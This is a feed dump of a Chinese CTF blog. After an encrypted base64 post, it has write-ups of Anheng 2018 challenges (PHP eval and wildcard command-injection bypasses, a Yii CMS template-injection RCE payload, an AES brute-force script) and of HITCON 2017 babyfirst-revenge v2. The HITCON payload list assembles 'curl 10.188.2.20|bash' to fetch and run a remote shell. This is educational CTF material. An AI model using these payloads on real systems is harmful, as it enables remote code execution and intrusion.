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 </div>]]></content>
    
    <summary type="html">
    
      CUMT平台的部分题解(实验课结束后开放)
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>安恒9月部分赛题复现</title>
    <link href="0verwatch.top/2018/09/30/anheng-9month/"/>
    <id>0verwatch.top/2018/09/30/anheng-9month/</id>
    <published>2018-09-30T05:41:02.000Z</published>
    <updated>2018-10-04T09:51:57.259Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>To be patient…</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>赶紧趁着电脑的屏幕修好了，刚好安恒的web题目有复现，赶紧做。。。。。又从这几个题目里面学习到新知识了<a id="more"></a>小结一下</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="babybypass"><a href="#babybypass" class="headerlink" title="babybypass"></a>babybypass</h4><p>这个题目我记得我当初做的时候是一直考虑着用<code>$</code>以及<code>_</code>去绕过这些数字字母之类的东西，突然发现他这个题目里面把那个<code>$</code>以及<code>_</code>也经过了过滤，这样的话就少了很多可能性，而且这题比原题的限制长度小了，更有难度。现在就开始总结一下从这个题目学到的知识点<br>1.php短标签输出，这个知识点很久之前就已经见过。<br><code>&lt;?=?&gt;</code>这个就是短标签，相当于<code>&lt;?php echo …;?&gt;</code>一般在php的配置文件<code>php.ini</code>中有一个<code>short_open_tag</code>的值，开启以后可以使用PHP的短标签：<code>&lt;? ?&gt;</code>，但是在现实开发中一般不推崇这种做法。。<br>但这个题目就很巧妙用了这个东西<br>2.第二个就是关于php函数eval函数的一些东西，这里的php执行函数是eval，在php官方手册上面有这样一句话，这是一个坑了，要想执行代码的话，我们就需要先用<code>?&gt;</code>去闭合，把上一段代码就给结束离开 ，然后我们才可以利用<code>&lt;?=?&gt;</code>去输出<br><a href="https://imgchr.com/i/ilI9II" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilI9II.md.png" alt="ilI9II.md.png"></a></p><p>区别一下有些系统执行函数比如system(有回显)，exec(没回显)，以及反引号这类的，这是直接执行系统函数的，一会我们也会用到<br><img src="https://s1.ax1x.com/2018/09/30/ilIPit.png" alt="ilIPit.png"><br><img src="https://s1.ax1x.com/2018/09/30/ilIiJP.png" alt="ilIiJP.png"></p><p>3.Linux通配符的作用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*        代表『 0 个或无穷多个』任意字符</span><br><span class="line">?        代表『一定有一个』任意字符</span><br></pre></td></tr></table></figure></p><p>4.Linux 下面一切皆文件<br>就是说我们平常一般在下面Linux下面的输入的命令，都可以通过文件去同样的执行，这对我来说是新知识。。。。。<br><img src="https://s1.ax1x.com/2018/09/30/ilIMiq.png" alt="ilIMiq.png"></p><p>然后我们就可以去实现payload，这个题目是Apache搭的，我们可以去默认目录先查看一波文件，一般来说默认目录在<code>/var/www/html</code></p><p>构造<code>code=?&gt;&lt;?=`/???/??? /???/???/????/*`;?&gt;</code>相当于<code>code=?&gt;&lt;?=` /bin/cat /var/www/html/*`;?&gt;</code></p><p>然后会发现php代码里面的源代码getflag那一部分的函数是是从/flag里面读取的。。。。听说这题的getflag函数也是个坑。。好像不能直接从url里面调用</p><p>所以再来构造一下<br><code>code=?&gt;&lt;?=`/???/??? /????`;?&gt;</code>相当于<code>code=?&gt;&lt;?=` /bin/cat /flag`;?&gt;</code>得到flag<br><a href="https://imgchr.com/i/ilIQJ0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIQJ0.md.png" alt="ilIQJ0.md.png"></a></p><h4 id="神奇的CMS"><a href="#神奇的CMS" class="headerlink" title="神奇的CMS"></a>神奇的CMS</h4><p>进入网站发现有用户登录，然后测试发现弱密码<br><code>admin admin123</code></p><p>然后点击几个模块发现有两个模块有点奇怪<br><a href="https://imgchr.com/i/ilIlWV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIlWV.md.png" alt="ilIlWV.md.png"></a></p><p>这两个模块一个模块有提示，另一个模块存在输入并且存在回显<br>先看提示，一是让你下载源码包，另外是提示flag在哪，先把源码包下载下来，源码里面有两个控制器，一个是<code>content</code>，另一个是<code>site</code></p><p>发现是Yii框架的东西，幸亏我还是做过Yii框架的开发的，对此还是有点小熟悉。。。</p><p>这里看回放的时候还是学到点东西的，就是我们在代码审计的时候一般要找有输入有输出的地方，这里很可能就存在这漏洞，这就相当于在脑里面建了一个模型，但是想想也很正常，平常我们学编程的时候也没过多的去考虑编程的输入输出，比如我们在一开始用C编程的时候你会忘掉除数不为0的前提吗？所以说我们更多的是考虑代码的核心功能能否实现。</p><p>所以在<code>ADD_IMG</code>(因为有输入有回显)页面里面就很有可能存在漏洞了，所以我们得专注代码里面描述这一段东西的内容</p><p> Yii框架讲究的是MVC架构，一般代码审计的话得先找<code>Controller</code>里面的东西毕竟都是些逻辑性的东西，关键的功能也在里面<br>所以在这个url里面的site是指的控制器，而backup就是site控制器里面的操作<br><img src="https://s1.ax1x.com/2018/09/30/ilI8QU.png" alt="ilI8QU.png"><br>我以前的博客讲过<br><a href="https://imgchr.com/i/ilIdF1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIdF1.md.png" alt="ilIdF1.md.png"></a></p><p>从代码里面你会发现<code>site</code>控制器里面都是些展示页面以及登陆的功能，但是不要过分以为登录里面会有sql注入，毕竟Yii框架里面是可以通过对login函数设置<code>rules</code>再来通过<code>validate</code>去检测是否出现SQL注入，所以出现sql注入机率不大</p><p>但是在回放里面学到了一种更骚气的代码调试的方法。。就是当你不懂框架的时候如何将其变成普通的php代码进行调试<br>这个方法就是将跟框架有关的东西去掉把关于框架的类看成一个普通的类，再把跟业务逻辑以及数据库相关操作的功能有关的去掉，然后新建那个类，单纯测试一下那个输入输出的函数就好</p><p>尝试调试，我这里用的phpstorm去调试，在<code>parstIf</code>函数下了断点，发现执行到下图所示的地方就会重新返回到echo输出语句中<br><a href="https://imgchr.com/i/ilIrQO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIrQO.md.png" alt="ilIrQO.md.png"></a><br>说明要在字符串里面加上<code>{if</code>此类的字符串<br>随便找一个地方加加，为的是能够进入else的循环<br><a href="https://imgchr.com/i/ilIbwj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIbwj.md.png" alt="ilIbwj.md.png"></a><br>进入else会发现到<code>buildregx</code>又会有一个新的函数，其实这个函数就是为了构建一个正则表达式，在字符串前后添加<code>/</code>，可以从debug的结果看得出来<br><a href="https://imgchr.com/i/ilIqTs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIqTs.md.png" alt="ilIqTs.md.png"></a><br>这时候我们就需要匹配<code>/{if:(.*?)}(.*?){end if}/is</code>这样的正则，但是之前的输入会导致其跳出该循环，从而又直接返回了结果，不能进入到for循环里面执行eval函数<br><a href="https://imgchr.com/i/ilIXYq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIXYq.md.png" alt="ilIXYq.md.png"></a><br>这时候就又需要构建对应的东西了，我们把正则里面的<code>(.*?)</code>改为自己随意的内容就好<br><a href="https://imgchr.com/i/ilIjf0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIjf0.md.png" alt="ilIjf0.md.png"></a><br>然后再追踪一次变化过程，经过<code>preg_match_all</code>这个函数的时候我们就可以看到这个函数会把原来的匹配的字符分成三段，首先是<code>iar[0][0]</code>是匹配到的字符串<code>{if:2333}23333{end if}</code>，然后是分别是第一个任意内容以及第二个任意内容匹正则配到的字符串，<code>iar[1][0]=2333,iar[2][0]=23333</code></p><p>继续走的话，这时候就可以进行一次循环了，因为现在arlen=1,然后我们就可以继续执行下去了，后买的事情就很简单了，先是判断<code>iar[1][0]</code>以及<code>iar[2][0]</code>里面是否有等号，再判断一下<code>iar[2][0]</code>里面是否有<code>{elseif</code>以及<code>else</code>，这几个判断都不影响<br><a href="https://imgchr.com/i/ilopXF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilopXF.md.png" alt="ilopXF.md.png"></a><br>最后还是将<code>iar[1][0]</code>放在这个eval语句里面执行<br><a href="https://imgchr.com/i/iloCm4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloCm4.md.png" alt="iloCm4.md.png"></a><br>梳理一下逻辑也就是说检查最少的是<code>iar[1][0]</code>，只检查他是否存在<code>=</code>，那就好办了，在eval语句中我们只需要对<code>iar[1][0</code>]闭合一下语句我们就可以执行我们想要的命令即可</p><p>Payload<br><code>{if:1)print_r(`cat /tmp/flag`);die();//}123{end if}</code>第一种思路直接在里面拼接命令执行语句即可<br><img src="https://s1.ax1x.com/2018/09/30/iloi79.png" alt="iloi79.png"></p><p>第二种思路就是在没有过滤<code>$GOLBALS</code>全局变量的前提下使用拼接，但个人感觉这东西会在PHP开发中给禁掉吧毕竟可能会对代码里面的其他变量造成影响，这个套路一般都是用来写过waf的小马用的</p><p><code>{if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);die();//}{end if}</code></p><p>尝试这个的是时候还以为服务器坏了。。。突然发现<code>processing request</code>。。。应该是没传参，传参了就好了</p><p><a href="https://imgchr.com/i/iloAt1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloAt1.md.png" alt="iloAt1.md.png"></a></p><p><a href="https://imgchr.com/i/iloM0H" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloM0H.md.png" alt="iloM0H.md.png"></a><br><a href="https://imgchr.com/i/iloQ7d" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloQ7d.md.png" alt="iloQ7d.md.png"></a></p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h4><p>这个题目帮我复习了一下信息安全数学基础第一章的内容，所以我就记录一下这个题目，其他题目就不写了</p><p>这个关键点就是作取余运算的时候结果是不会超过余数的，如果有打过ACM的人就会知道有一个叫快速幂的东西跟这个也差不多，极大地降低了代码所需要的空间度，使得数不会越界</p><p>观察主函数现在我们需要的就是<code>passwd</code>这个参数，但是从<code>generate_passwd</code>是得到最多<code>passwd</code>不会超过<code>0xB18E</code>，所以我们就可以选择爆破<br><a href="https://imgchr.com/i/ilo3tI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilo3tI.md.png" alt="ilo3tI.md.png"></a></p><p>跑一下脚本就可以得到flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(data, password)</span>:</span></span><br><span class="line">    bs = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)</span><br><span class="line">    iv = <span class="string">"0102030405060708"</span></span><br><span class="line">    cipher = AES.new(password, AES.MODE_CBC, iv)</span><br><span class="line">    data = cipher.encrypt(pad(data))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(data, password)</span>:</span></span><br><span class="line">    unpad = <span class="keyword">lambda</span> s : s[<span class="number">0</span>:-ord(s[<span class="number">-1</span>])]</span><br><span class="line">    iv = <span class="string">"0102030405060708"</span></span><br><span class="line">    cipher = AES.new(password, AES.MODE_CBC, iv)</span><br><span class="line">    data  = cipher.decrypt(data)</span><br><span class="line">    <span class="keyword">return</span> unpad(data)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_passwd</span><span class="params">(key,result)</span>:</span></span><br><span class="line">    data_halt = <span class="string">"LvR7GrlG0A4WIMBrUwTFoA=="</span>.decode(<span class="string">"base64"</span>)</span><br><span class="line">    rand_int =  int(decrypt(data_halt, key).encode(<span class="string">"hex"</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="comment">#round = 0x7DC59612</span></span><br><span class="line">    result = result * (rand_int % <span class="number">0xB18E</span>) % <span class="number">0xB18E</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(str(result), key)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    key = <span class="string">'17abeca4cc4c432a52c2b7f6d24d1888'</span></span><br><span class="line">    </span><br><span class="line">    output = <span class="string">"u6WHK2bnAsvTP/lPagu7c/K3la0mrveKrXryBPF/LKFE2HYgRNLGzr1J1yObUapw"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> range(<span class="number">0xB18E</span>):</span><br><span class="line">        passwd = generate_passwd(key.decode(<span class="string">"hex"</span>),result)</span><br><span class="line">        r = decrypt(output.decode(<span class="string">"base64"</span>), passwd)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="keyword">print</span> r</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;To be patient…&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;赶紧趁着电脑的屏幕修好了，刚好安恒的web题目有复现，赶紧做。。。。。又从这几个题目里面学习到新知识了
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
      <category term="Crypto" scheme="0verwatch.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Hitcon2017 babyfirst-revenge v2复现</title>
    <link href="0verwatch.top/2018/09/18/hitcon2017-babyfirstv2/"/>
    <id>0verwatch.top/2018/09/18/hitcon2017-babyfirstv2/</id>
    <published>2018-09-18T14:36:10.000Z</published>
    <updated>2018-09-18T14:39:35.907Z</updated>
    
    <content type="html"><![CDATA[<p>这个题目的条件更加苛刻了，先放个源码<a id="more"></a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></p><p>简单看一下这段代码比上一次的代码的cmd长度更小，很显然我们就不能再以<code>ls&gt;&gt;_</code> 来将相关的命令覆盖到文件里面了<br>但是orange大大用的方法真是叹为观止，根据官方payload一步步来分析这里是怎么巧妙的绕过4个字符串的长度的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">payload = [ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate "g&gt; ht- sl" to file "v"</span></span><br><span class="line"> <span class="string">'&gt;dir'</span>, </span><br><span class="line"><span class="string">'&gt;sl'</span>,</span><br><span class="line"> <span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line"> <span class="string">'&gt;ht-'</span>,</span><br><span class="line"> <span class="string">'*&gt;v'</span>,</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment"># reverse file "v" to file "x", content "ls -th &gt;g"</span></span><br><span class="line"> <span class="string">'&gt;rev'</span>,</span><br><span class="line"> <span class="string">'*v&gt;x'</span>, </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate "curl orange.tw|python;"</span></span><br><span class="line"> <span class="comment"># generate "curl 10.188.2.20|bash" </span></span><br><span class="line"><span class="string">'&gt;\;\\'</span>,</span><br><span class="line"> <span class="string">'&gt;sh\\'</span>, </span><br><span class="line"><span class="string">'&gt;ba\\'</span>,</span><br><span class="line"> <span class="string">'&gt;\|\\'</span>,</span><br><span class="line"> <span class="string">'&gt;20\\'</span>,</span><br><span class="line"> <span class="string">'&gt;2.\\'</span>,</span><br><span class="line"> <span class="string">'&gt;8.\\'</span>,</span><br><span class="line"> <span class="string">'&gt;18\\'</span>,</span><br><span class="line"> <span class="string">'&gt;0.\\'</span>,</span><br><span class="line"> <span class="string">'&gt;1\\'</span>,</span><br><span class="line"> <span class="string">'&gt;\ \\'</span>,</span><br><span class="line"> <span class="string">'&gt;rl\\'</span>,</span><br><span class="line"> <span class="string">'&gt;cu\\'</span>,</span><br><span class="line"></span><br><span class="line"> <span class="comment"># got shell</span></span><br><span class="line"> <span class="string">'sh x'</span>, </span><br><span class="line"><span class="string">'sh g'</span>,</span><br><span class="line"> ]</span><br></pre></td></tr></table></figure><p>首先第一个知识点就是Linux下存在<code>dir</code>命令作为<code>ls</code>命令的别名，可能有的系统没有，但是对于这道题而言是有的，而且他也是默认以字典序去排列，对于这题而言这个命令起到了拼接文件名的效果，但是注意含有特殊字符以及数字的情况下，字母排序的优先级会降低<br><img src="https://s1.ax1x.com/2018/09/18/ietTMt.png" 